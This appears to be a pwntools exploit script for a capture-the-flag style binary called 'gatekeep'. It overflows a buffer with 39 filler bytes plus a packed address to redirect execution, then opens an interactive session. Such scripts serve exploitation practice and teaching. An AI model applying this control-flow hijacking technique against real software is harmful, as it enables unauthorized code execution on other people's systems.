from pwn import *

io = process('./gatekeep')
#gdb.attach(io, api=True)

payload = b'a'*39 + p64(0x11d5)
io.send(payload)
io.interactive()